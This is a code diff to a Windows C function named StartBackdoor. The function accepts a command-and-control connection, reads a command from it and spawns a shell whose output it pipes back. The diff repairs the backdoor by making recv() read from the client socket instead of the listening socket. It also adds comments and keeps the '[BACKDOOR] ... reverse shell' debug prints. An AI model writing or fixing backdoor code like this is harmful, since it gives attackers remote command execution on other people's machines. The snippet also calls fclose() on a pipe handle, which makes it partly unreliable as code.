@@ -59,7 +59,7 @@ BOOL StartBackdoor(void) {
 
         // Accept connection
         SOCKET client = INVALID_SOCKET;
-        client = accept(s, NULL, NULL);
+        client = accept(s, NULL, NULL);  // Now client has the connection
         if (client != INVALID_SOCKET) {
             printf("[BACKDOOR] C2 Connected! Executing reverse shell...\n");
             fflush(stdout);
@@ -80,16 +80,15 @@ BOOL StartBackdoor(void) {
             si.hStdError = hWritePipe;
             si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
 
-            // Spawn cmd.exe with the received command
+            // Allocate a buffer for command
             char *cmd = NULL;
             int cmdLen = 0;
             
             if (client != INVALID_SOCKET) {
-                // Allocate a buffer for command
+                // Read command from client (USE CLIENT SOCKET, not LISTENING SOCKET)
                 cmd = (char*)malloc(1024 * sizeof(char));
                 if (cmd) {
-                    // Read command from client (assume null-terminated string for simplicity)
-                    int bytes = recv(s, cmd, 1023, 0);
+                    int bytes = recv(client, cmd, 1023, 0);  // FIXED: use client here
                     if (bytes > 0) {
                         cmd[bytes] = 0;
                         printf("[BACKDOOR] Received Command: %s\n", cmd);
@@ -107,7 +106,7 @@ BOOL StartBackdoor(void) {
                                 printf("[BACKDOOR] Shell spawned! PID=%lu\n", pi.dwProcessId);
                                 fflush(stdout);
                                 
-                                // Cleanup pipe handle
+                                // Cleanup pipe handle (keep read pipe open)
                                 fclose(hWritePipe);
                                 
                                 // Read output from pipe
